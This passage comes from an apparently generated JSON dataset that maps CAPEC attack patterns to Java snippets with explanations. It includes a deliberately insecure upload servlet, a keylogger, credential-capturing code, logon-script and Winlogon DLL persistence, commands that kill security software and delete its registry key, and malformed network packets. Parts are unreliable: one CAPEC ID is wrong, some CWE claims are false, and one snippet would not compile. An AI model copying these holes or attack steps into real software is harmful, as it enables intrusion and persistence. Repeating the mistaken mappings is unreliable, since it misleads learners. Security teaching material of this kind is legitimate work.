        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = getFileName(filePart);\n        String uploadPath = getServletContext().getRealPath(\"\") + File.separator + \"uploads\";\n        File uploadDir = new File(uploadPath);\n        if (!uploadDir.exists()) uploadDir.mkdir();\n        File file = new File(uploadPath + File.separator + fileName);\n        try (InputStream fileContent = filePart.getInputStream(); FileOutputStream fos = new FileOutputStream(file)) {\n            int read;\n            final byte[] bytes = new byte[1024];\n            while ((read = fileContent.read(bytes)) != -1) {\n                fos.write(bytes, 0, read);\n            }\n        }\n        response.getWriter().println(\"File uploaded successfully!\");\n    }\n\n    private String getFileName(Part part) {\n        String contentDisp = part.getHeader(\"content-disposition\");\n        String[] items = contentDisp.split(\";\");\n        for (String s : items) {\n            if (s.trim().startsWith(\"filename\")) {\n                return s.substring(s.indexOf('=') + 2, s.length() - 1);\n            }\n        }\n        return \"\";\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload functionality. The servlet handles file uploads via HTTP POST requests. The uploaded file is saved directly to the web server's document root directory without proper validation or access control. This can lead to several security issues as described in the CAPEC and related CWEs:\n\n1. **Improper Access Control (CWE-284)**: The code does not restrict access to the uploaded files, allowing unauthorized users to upload potentially malicious files.\n2. **Storage of File with Sensitive Data Under Web Root (CWE-219)**: The uploaded files are stored under the web document root, making them accessible to anyone who knows the URL.\n3. **Unparsed Raw Web Content Delivery (CWE-433)**: The code does not check the file type or content, potentially allowing raw or executable content to be stored and executed.\n4. **Reliance on File Name or Extension of Externally-Supplied File (CWE-646)**: The code relies on the file name provided by the user, which can be manipulated to bypass security checks.\n5. **Download of Code Without Integrity Check (CWE-494)**: Although not directly shown in this snippet, the lack of integrity checks on uploaded files can lead to execution of malicious code.\n\nOverall, this code snippet represents the main idea of the CAPEC by demonstrating how an adversary could upload a malicious file to a shared webroot and execute it, exploiting the web server's context and permissions."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import java.io.*;\n\npublic class LogonScriptModifier {\n    private static final String LOGON_SCRIPT_PATH = \"C:\\\\Windows\\\\System32\\\\GroupPolicy\\\\User\\\\Scripts\\\\Logon\\\\logon.bat\";\n    private static final String MALICIOUS_CODE = \"echo Malicious code executed >> C:\\\\malicious.log\";\n\n    public static void main(String[] args) {\n        try {\n            // Check if the logon script exists\n            File logonScript = new File(LOGON_SCRIPT_PATH);\n            if (logonScript.exists() && logonScript.canWrite()) {\n                // Append malicious code to the logon script\n                BufferedWriter writer = new BufferedWriter(new FileWriter(logonScript, true));\n                writer.write(MALICIOUS_CODE);\n                writer.newLine();\n                writer.close();\n                System.out.println(\"Malicious code added to logon script.\");\n            } else {\n                System.out.println(\"Logon script does not exist or is not writable.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker could modify a logon script to include malicious code. The code checks if the logon script exists and is writable. If so, it appends a line of malicious code to the script. This code represents the CAPEC 'Run Software at Logon' by showing how an attacker can gain persistence by modifying logon scripts. The related CWEs are represented as follows: CWE-284 (Improper Access Control) is shown by the lack of proper access restrictions on the logon script, CWE-798 and CWE-259 (Use of Hard-coded Credentials/Password) are implied by the use of a hard-coded path and the assumption that the script is writable without proper authentication checks."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PasswordSprayingExample {\n    private static Map<String, String> users = new HashMap<>();\n    private static int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    static {\n        // Weak password requirements (CWE-521)\n        users.put(\"user1\", \"password123\");\n        users.put(\"user2\", \"password123\");\n        users.put(\"user3\", \"password123\");\n    }\n\n    public static void main(String[] args) {\n        String[] commonPasswords = {\"password123\", \"123456\", \"qwerty\"};\n        for (String password : commonPasswords) {\n            for (String user : users.keySet()) {\n                if (authenticate(user, password)) {\n                    System.out.println(\"User \" + user + \" authenticated successfully with password: \" + password);\n                } else {\n                    failedAttempts++;\n                    if (failedAttempts >= MAX_ATTEMPTS) {\n                        System.out.println(\"Too many failed attempts. Locking out.\");\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Single-factor authentication (CWE-308)\n        return users.containsKey(username) && users.get(username).equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Password Spraying attack. The code initializes a map of users with weak passwords (CWE-521). It then iterates over a list of common passwords and attempts to authenticate each user with these passwords. The authentication method uses single-factor authentication (CWE-308), checking only the username and password. The code also includes a basic mechanism to count failed attempts and lock out after a certain number of failures, but this is not sufficient to prevent a Password Spraying attack effectively. The snippet highlights the vulnerabilities associated with weak password requirements, single-factor authentication, and insufficient measures to prevent excessive authentication attempts."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class PasswordHasher {\n    public static void main(String[] args) {\n        String password = \"password123\";\n        String salt = \"1234\"; // Predictable salt\n        String hashedPassword = hashPassword(password, salt);\n        System.out.println(\"Hashed Password: \" + hashedPassword);\n    }\n\n    public static String hashPassword(String password, String salt) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n            md.update(salt.getBytes());\n            byte[] hashedBytes = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hashedBytes) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of password hashing. The `hashPassword` method uses SHA-256 to hash a password combined with a predictable salt ('1234'). This approach is vulnerable because the salt is not unique or random, making it easier for attackers to use precomputed hash tables (rainbow tables) to crack the hashed passwords. The code embodies the main idea of the deprecated CAPEC 'Dump Password Hashes' by showing how improper handling of password hashing can lead to security weaknesses, specifically CWE-760 (Use of a One-Way Hash with a Predictable Salt)."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableConfigLoader {\n    public static void main(String[] args) {\n        Properties config = new Properties();\n        try {\n            // Using an obsolete function to load configuration\n            FileInputStream fis = new FileInputStream(new File(\"config.properties\"));\n            config.load(fis);\n            fis.close();\n\n            // Using DNS lookup in a security decision\n            String trustedHost = config.getProperty(\"trustedHost\");\n            if (trustedHost != null && trustedHost.equals(java.net.InetAddress.getByName(\"trusted.example.com\").getHostName())) {\n                System.out.println(\"Host is trusted.\");\n            } else {\n                System.out.println(\"Host is not trusted.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration loader that embodies the deprecated CAPEC 'Obtain Data via Utilities' and related CWEs. The code uses the obsolete `FileInputStream` function to load configuration data from a properties file, which is indicative of CWE-477 (Use of Obsolete Function). Additionally, it makes a security decision based on a DNS lookup, which is related to CWE-247 (Reliance on DNS Lookups in a Security Decision). The code checks if a host is trusted by comparing it to a DNS-resolved hostname, which can be manipulated, leading to potential security risks."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.awt.event.KeyEvent;\nimport java.awt.event.KeyListener;\nimport javax.swing.JFrame;\n\npublic class Keylogger extends JFrame implements KeyListener {\n    private static final String LOG_FILE = \"keystrokes.log\";\n\n    public Keylogger() {\n        this.addKeyListener(this);\n        this.setSize(300, 200);\n        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        this.setVisible(true);\n    }\n\n    @Override\n    public void keyTyped(KeyEvent e) {}\n\n    @Override\n    public void keyPressed(KeyEvent e) {\n        logKeystroke(e.getKeyChar());\n    }\n\n    @Override\n    public void keyReleased(KeyEvent e) {}\n\n    private void logKeystroke(char keyChar) {\n        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {\n            writer.write(keyChar);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        new Keylogger();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple keylogger application. The keylogger captures all keystrokes made by the user and logs them to a file named 'keystrokes.log'. The Keylogger class extends JFrame and implements the KeyListener interface to capture key events. The keyPressed method logs each keystroke by appending it to the log file. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by showing how an adversary could capture user input, including sensitive information like passwords. The related CWEs provide context on potential weaknesses, such as the use of weak or hard-coded credentials, insufficiently protected credentials, and weak password requirements, which could be exploited in conjunction with a keylogger to compromise user accounts."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class Keylogger {\n    public static void main(String[] args) {\n        try (FileWriter writer = new FileWriter(\"log.txt\", true);\n             Scanner scanner = new Scanner(System.in)) {\n            System.out.println(\"Enter your username:\");\n            String username = scanner.nextLine();\n            System.out.println(\"Enter your password:\");\n            String password = scanner.nextLine();\n            writer.write(\"Username: \" + username + \", Password: \" + password + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple keylogger that captures user input for a username and password and writes it to a log file. The code leverages the CAPEC concept of 'Collect Data as Provided by Users' by capturing sensitive information that the user legitimately enters into the system. The code also embodies several related CWEs: \n- CWE-200: The sensitive information (username and password) is exposed to an unauthorized actor by writing it to a log file without proper protection.\n- CWE-214: The sensitive information is captured in a way that could be visible to other processes or users on the system.\n- CWE-497: The code does not prevent unauthorized access to the log file, exposing sensitive system-level information.\nThis example highlights the risks associated with improperly handling user-provided data and the potential for misuse in follow-on attacks."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // Use of obsolete function (CWE-477)\n            URL url = new URL(\"http://example.com\");\n            URLConnection connection = url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            // Unchecked error condition (CWE-391)\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of an obsolete function (CWE-477) and unchecked error conditions (CWE-391). The code attempts to open a URL connection and read data from it using deprecated methods. Additionally, it catches a generic Exception and prints the stack trace, which is an example of unchecked error handling. This can lead to security vulnerabilities as it does not properly handle specific error conditions, potentially allowing an attacker to induce unexpected behavior."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class LogBlocker {\n    private static final Logger logger = Logger.getLogger(\"MyLog\");\n    private static boolean blockLogs = true; // Simulate blocking logs\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"/var/log/myapp.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            if (blockLogs) {\n                // Simulate blocking logs by not writing to the central repository\n                System.out.println(\"Logs are being blocked from central repository.\");\n            } else {\n                logger.info(\"This is a log message.\");\n            }\n        } catch (SecurityException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Simulate a security-critical event\n    public static void securityCriticalEvent() {\n        if (!blockLogs) {\n            logger.warning(\"Security-critical event occurred.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of blocking logs from being delivered to a central repository, which is the main idea of the CAPEC 'Block Logging to Central Repository'. The 'blockLogs' boolean variable simulates the condition where logs are prevented from being sent to the central repository. The code uses Java's logging framework to write logs to a file, but if 'blockLogs' is true, it prints a message indicating that logs are being blocked instead of actually logging the information. This represents an adversary's attempt to hide indicators of compromise. The 'securityCriticalEvent' method simulates a security-critical event that would normally be logged, but is not logged if 'blockLogs' is true. This example also touches on CWE-778 (Insufficient Logging) by not logging the security-critical event when logs are blocked."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class FileInflation {\n    public static void main(String[] args) {\n        String filePath = \"example.txt\";\n        try {\n            // Create a file if it doesn't exist\n            File file = new File(filePath);\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Inflate the file size by appending large data\n            try (FileOutputStream fos = new FileOutputStream(file, true)) {\n                byte[] largeData = new byte[1024 * 1024 * 10]; // 10 MB of data\n                fos.write(largeData);\n            }\n\n            // Read the file to simulate processing\n            byte[] fileData = Files.readAllBytes(Paths.get(filePath));\n            System.out.println(\"File size after inflation: \" + fileData.length + \" bytes\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of artificially inflating file sizes, which can lead to a Denial of Service (DoS) condition on devices with limited storage capacity. The code creates a file named 'example.txt' if it doesn't already exist and then appends 10 MB of data to it. This process can be repeated to continuously inflate the file size. The code also reads the file to simulate processing, which could be exploited in a real-world scenario to cause resource exhaustion. This snippet embodies the main idea of CAPEC-27 and touches on related CWEs such as CWE-774 (unrestricted allocation of file descriptors) and CWE-409 (improper handling of large data)."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ProcessFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list all running processes\n            Process process = Runtime.getRuntime().exec(\"ps -aux\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of process footprinting. The code executes a system command (`ps -aux`) to list all running processes on the target system and prints the output to the console. This can expose sensitive information about the system's processes to unauthorized users (CWE-200). The code does not restrict access to the process information, potentially allowing an adversary to gather details about the target environment, which aligns with the CAPEC description. Additionally, the use of command-line arguments and environment variables (CWE-214) can further expose sensitive information if not properly managed."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ServiceFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Command to list all services on a Windows system\n            String command = \"tasklist /svc\";\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of 'Services Footprinting' by executing a system command to list all services running on a Windows system. The command 'tasklist /svc' is used to obtain the list of services, and the output is printed to the console. This code embodies the main idea of CAPEC-309 by exposing sensitive system information (list of services) to an unauthorized actor. The related CWEs are represented as follows:\n- CWE-200: The code exposes sensitive information (services list) to any user running the program.\n- CWE-497: The code does not restrict access to system-level information, allowing unauthorized users to view it.\n- CWE-214: The command and its output can be seen by other processes on the system.\n- CWE-1229: The code indirectly creates a resource (services list) that can be exploited by attackers."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class AccountFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list all users on the system\n            Process process = Runtime.getRuntime().exec(\"net user\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of 'Account Footprinting' by executing a system command to list all user accounts on a Windows system using 'net user'. The output of this command is read and printed to the console. This represents CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes potentially sensitive information about user accounts to anyone who can run this code. The code also touches on CWE-214 (Invocation of Process Using Visible Sensitive Information) as the command and its output can be visible to other processes on the system."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class GroupPermissionFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute the command to list local groups\n            Process process = Runtime.getRuntime().exec(\"net localgroup\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to 'Group Permission Footprinting' (CAPEC). The code executes a system command 'net localgroup' to list all local groups on a Windows system. The output of this command, which includes sensitive information about user groups and their permissions, is then printed to the console. This can expose sensitive information to unauthorized actors (CWE-200). The code also indirectly highlights the risk of invoking processes with visible sensitive information (CWE-214) and the potential for exposing access control list files (CWE-529). The main idea is to show how an adversary could exploit functionality meant for authorized users to gather information that could be used for further malicious activities."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.attribute.BasicFileAttributes;\n\npublic class OwnerFootprinting {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java OwnerFootprinting <directory>\");\n            return;\n        }\n\n        File dir = new File(args[0]);\n        if (!dir.isDirectory()) {\n            System.out.println(\"Provided path is not a directory\");\n            return;\n        }\n\n        File[] files = dir.listFiles();\n        if (files != null) {\n            for (File file : files) {\n                try {\n                    BasicFileAttributes attrs = Files.readAttributes(file.toPath(), BasicFileAttributes.class);\n                    System.out.println(\"File: \" + file.getName() + \", Last Modified Time: \" + attrs.lastModifiedTime());\n                } catch (IOException e) {\n                    System.out.println(\"Error reading attributes for file: \" + file.getName());\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Owner Footprinting' by listing files in a specified directory and printing their last modified times. This can reveal information about user activity on the system. The code takes a directory path as an argument, checks if it is a valid directory, and then iterates over the files in that directory. For each file, it retrieves and prints the last modified time using the BasicFileAttributes class. This information can be used by an adversary to infer user activity, which aligns with the CAPEC description. The code also touches on related CWEs by potentially exposing sensitive file information (CWE-200, CWE-497) and demonstrating how sensitive information can be accessed through file attributes (CWE-214)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class DisableSecuritySoftware {\n    private static final String SECURITY_TOOL_PROCESS = \"SecurityTool.exe\";\n    private static final String HARD_CODED_ADMIN_PASSWORD = \"admin123\";\n    private static final Logger LOGGER = Logger.getLogger(DisableSecuritySoftware.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Attempt to kill the security tool process\n            Process process = Runtime.getRuntime().exec(\"taskkill /F /IM \" + SECURITY_TOOL_PROCESS);\n            process.waitFor();\n            LOGGER.log(Level.INFO, \"Security tool process killed.\");\n\n            // Delete registry key to prevent security tool from starting at runtime\n            Process regDelete = Runtime.getRuntime().exec(\"reg delete HKLM\\\\Software\\\\SecurityTool /f\");\n            regDelete.waitFor();\n            LOGGER.log(Level.INFO, \"Registry key deleted.\");\n\n            // Use hard-coded credentials to perform unauthorized actions\n            if (authenticate(HARD_CODED_ADMIN_PASSWORD)) {\n                LOGGER.log(Level.INFO, \"Authenticated with hard-coded credentials.\");\n                // Perform additional malicious actions\n            }\n        } catch (IOException | InterruptedException e) {\n            LOGGER.log(Level.SEVERE, \"An error occurred.\", e);\n        }\n    }\n\n    private static boolean authenticate(String password) {\n        // Simulate authentication check\n        return HARD_CODED_ADMIN_PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might disable security software by exploiting improper access control and using hard-coded credentials. The code attempts to kill a security tool process, delete a registry key to prevent the tool from starting at runtime, and authenticate using hard-coded credentials to perform unauthorized actions. This embodies the CAPEC 'Disable Security Software' by showing how security mechanisms can be bypassed or disabled, leveraging related CWEs such as improper access control (CWE-284) and use of hard-coded credentials (CWE-798)."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.prefs.Preferences;\n\npublic class WinlogonHelperDLL {\n    public static void main(String[] args) {\n        // CWE-15: External Control of System or Configuration Setting\n        Preferences systemPrefs = Preferences.systemRoot();\n        try {\n            // CWE-798: Use of Hard-coded Credentials\n            System.setProperty(\"java.util.prefs.systemRoot\", \"/etc/.java\");\n            System.setProperty(\"java.util.prefs.userRoot\", \"/etc/.java\");\n            systemPrefs.put(\"WinlogonHelperDLL\", \"C:\\\\malicious.dll\");\n            systemPrefs.flush();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        // CWE-427: Uncontrolled Search Path Element\n        try (FileOutputStream fos = new FileOutputStream(\"C:\\\\malicious.dll\")) {\n            String dllContent = \"malicious code\";\n            fos.write(dllContent.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might exploit the 'Replace Winlogon Helper DLL' vulnerability in Windows systems prior to Windows Vista. The code modifies a system registry key to load a malicious DLL at startup. It uses hard-coded paths and credentials (CWE-798) to set the system preferences (CWE-15) and writes a malicious DLL to a location that will be loaded by the system (CWE-427). The code represents the main idea of the CAPEC by showing how an attacker can manipulate system settings to execute arbitrary code at startup."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class SystemFootprintingExample {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/api/system-info\";\n            URL url = new URL(targetUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // Print the response which may contain sensitive system information\n                System.out.println(\"Response: \" + response.toString());\n            } else if (responseCode == 404) {\n                System.out.println(\"Resource not found\");\n            } else {\n                System.out.println(\"Unexpected response code: \" + responseCode);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of system footprinting by making an HTTP GET request to a target URL. The response from the server is printed to the console, which may contain sensitive system information. This embodies the main idea of CAPEC-170 (System Footprinting) by actively probing a remote system to gather information. The code also illustrates several related CWEs: \n- CWE-204 (Observable Response Discrepancy) and CWE-205 (Observable Behavioral Discrepancy) are represented by the different responses based on the HTTP status code, revealing information about the system's state.\n- CWE-208 (Observable Timing Discrepancy) could be inferred if the time taken to respond varies based on the internal state of the system.\n- CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is demonstrated by printing the response, which may include sensitive information.\n- CWE-426 (Untrusted Search Path) is not directly represented in this snippet but could be relevant if the URL or other resources were dynamically constructed based on untrusted input."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SecurityFootprint {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list installed security software\n            String[] commands = {\"cmd.exe\", \"/c\", \"wmic product get name,version\"};\n            Process process = Runtime.getRuntime().exec(commands);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of 'Security Software Footprinting' by attempting to list all installed software on a Windows system, which may include security tools. The code uses the `wmic` command to get the names and versions of installed products. This can expose sensitive system information (CWE-497) to unauthorized users if executed in an insecure context. The code does not include any checks to prevent unauthorized access, making it vulnerable to misuse. Additionally, if this code were part of a larger application, it could be exploited to embed malicious code (CWE-506) or act as a Trojan Horse (CWE-507)."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class RouteDisablingExample {\n    public static void main(String[] args) {\n        String targetHost = \"192.168.1.100\";\n        int targetPort = 8080;\n\n        try {\n            // Attempt to establish a connection to the target\n            Socket socket = new Socket(targetHost, targetPort);\n            System.out.println(\"Connection established to \" + targetHost + \":\" + targetPort);\n\n            // Simulate route disabling by closing the socket\n            socket.close();\n            System.out.println(\"Route disabled: Connection closed.\");\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + targetHost);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of route disabling by establishing a connection to a target host and then immediately closing the connection. The code attempts to connect to a specified IP address and port, simulating a communication channel. Once the connection is established, it is closed to represent the severing of the communication route. This embodies the main idea of the CAPEC 'Route Disabling' by targeting the route itself. The related CWEs are represented in the context of improper handling of communication channels, such as not ensuring message integrity, incorrect destination specification, and potential race conditions."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import java.io.IOException;\nimport java.net.Socket;\n\npublic class NetworkDisabler {\n    private static final String TARGET_IP = \"192.168.1.1\";\n    private static final int TARGET_PORT = 8080;\n\n    public static void main(String[] args) {\n        try {\n            // Attempt to disable network hardware by sending malformed packets\n            Socket socket = new Socket(TARGET_IP, TARGET_PORT);\n            socket.getOutputStream().write(new byte[]{0x00, 0x00, 0x00, 0x00}); // CWE-1334: Error Injection\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Improperly preserved state during power save/restore operation\n        // CWE-1304: Simulate power save/restore without state integrity check\n        System.out.println(\"Simulating power save/restore operation...\");\n        boolean powerSaveMode = true;\n        if (powerSaveMode) {\n            // Simulate power save\n            System.out.println(\"Entering power save mode...\");\n        }\n        // Restore operation without integrity check\n        System.out.println(\"Restoring from power save mode...\");\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Disabling Network Hardware' attack pattern described in CAPEC. The code attempts to disable network hardware by sending malformed packets to a target IP and port, representing CWE-1334 (Unauthorized Error Injection). Additionally, it simulates a power save/restore operation without ensuring the integrity of the configuration state, representing CWE-1304 (Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation). The code highlights the potential vulnerabilities in network hardware and power management operations that can be exploited by an adversary."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class BGPRouteDisabler {\n    public static void main(String[] args) {\n        try {\n            // Incorrectly specified destination (CWE-941)\n            String targetAS = \"192.0.2.0\";\n            Socket socket = new Socket(targetAS, 179); // BGP typically uses port 179\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n\n            // Sending a malformed BGP update to suppress route (CWE-924)\n            String bgpUpdate = \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\x00\\x13\\x02\\x00\\x00\\x00\";\n            out.println(bgpUpdate);\n\n            // Close the connection\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified and vulnerable example of how an adversary might attempt to disable a BGP route by sending a malformed BGP update message to a target Autonomous System (AS). The code opens a socket connection to the target AS on the BGP port (179) and sends a malformed BGP update message. This action embodies the main idea of the CAPEC 'BGP Route Disabling' by attempting to suppress the BGP advertisement for a route, rendering the underlying network inaccessible. The code also reflects related CWEs: CWE-941 (Incorrectly Specified Destination in a Communication Channel) by specifying a potentially incorrect target AS, and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by sending a malformed message without ensuring its integrity."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
